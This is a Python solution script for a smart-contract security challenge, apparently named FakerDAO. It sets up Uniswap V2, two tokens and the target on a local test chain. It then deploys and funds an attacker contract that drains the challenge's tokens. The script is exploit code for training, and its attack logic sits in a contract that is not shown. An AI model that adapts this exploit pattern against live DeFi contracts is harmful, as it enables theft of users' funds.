from ape import accounts, project
from .utils.helper import w3, get_timestamp, MAX_UINT256

INITIAL_LP_LIQUIDITY = w3.to_wei(1000000, "ether")
INITIAL_ATTACKER_TOKEN_BALANCE = w3.to_wei(5000, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy uniswap v2 contracts
    print("\n--- Deploying UniswapV2 contracts ---\n")
    factory = project.UniswapV2Factory.deploy(
        deployer.address,
        sender=deployer,
    )
    weth = project.WETH9.deploy(sender=deployer)
    router = project.UniswapV2Router02.deploy(
        factory.address,
        weth.address,
        sender=deployer,
    )
    # deploy token contracts
    print("\n--- Deploying Token Contracts ---\n")
    yin = project.Token.deploy(
        "YIN",
        deployer.address,
        INITIAL_LP_LIQUIDITY + INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )
    yang = project.Token.deploy(
        "YANG",
        deployer.address,
        INITIAL_LP_LIQUIDITY + INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )

    # sending attacker 5000 of each token
    yin.transfer(
        attacker.address,
        INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )
    yang.transfer(
        attacker.address,
        INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )

    # print create pair
    print("\n--- Creating pair ---\n")
    pair_address = factory.createPair(
        yin.address,
        yang.address,
        sender=deployer,
    ).return_value

    # deploy challenge contract
    print("\n--- Deploying Challenge Contract ---\n")
    challenge = project.FakerDAO.deploy(pair_address, sender=deployer)

    # approve router for tokens
    yin.approve(router.address, MAX_UINT256, sender=deployer)
    yang.approve(router.address, MAX_UINT256, sender=deployer)

    # adding liquidity to pair
    router.addLiquidity(
        yin.address,
        yang.address,
        INITIAL_LP_LIQUIDITY,
        INITIAL_LP_LIQUIDITY,
        1,
        1,
        challenge.address,
        get_timestamp() * 2,
        sender=deployer,
    )

    # define initial balances for attacker
    attacker_initial_bal = challenge.balanceOf(attacker.address) / 10**18

    print(f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n---\n")

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.FakerDAOAttacker.deploy(
        challenge.address,
        router.address,
        sender=attacker,
    )
    yin.transfer(
        attacker_contract.address,
        yin.balanceOf(attacker.address),
        sender=attacker,
    )
    yang.transfer(
        attacker_contract.address,
        yang.balanceOf(attacker.address),
        sender=attacker,
    )
    attacker_contract.attack(w3.to_wei(1420, "ether"), sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Stole all YODA tokens from Challenge contract ---\n")

    # define ending balances for attacker and vault
    attacker_final_bal = challenge.balanceOf(attacker.address) / 10**18

    print(f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n---\n")

    assert challenge.balanceOf(attacker.address) > 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
